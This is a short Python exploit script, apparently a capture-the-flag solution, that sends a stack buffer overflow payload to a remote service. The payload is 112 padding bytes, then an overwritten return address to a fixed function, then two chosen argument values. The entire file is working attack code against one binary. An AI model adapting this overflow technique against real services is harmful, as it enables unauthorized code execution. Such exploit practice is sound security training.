#!/usr/bin/env/python3

import argparse
import socket
import struct
from pwn import *

parser = argparse.ArgumentParser()
parser.add_argument("host", type=str, help="The host address to connect to")
parser.add_argument("port", type=int, help="The port to connect to")

args = parser.parse_args()

offset = 112
new_eip = p32(0x08049296)
return_address = p32(0x08049372)

payload = [
    b"A" * offset,
    new_eip,
    return_address,
    p32(0xCAFEF00D),
    p32(0xF00DF00D),
    b"\n",
]
payload = b"".join(payload)

# print(payload)

with socket.socket() as connection:
    connection.connect((args.host, args.port))
    print(connection.recv(2048).decode("utf-8"))
    connection.send(payload)
    print(connection.recv(2048))

# 08049296
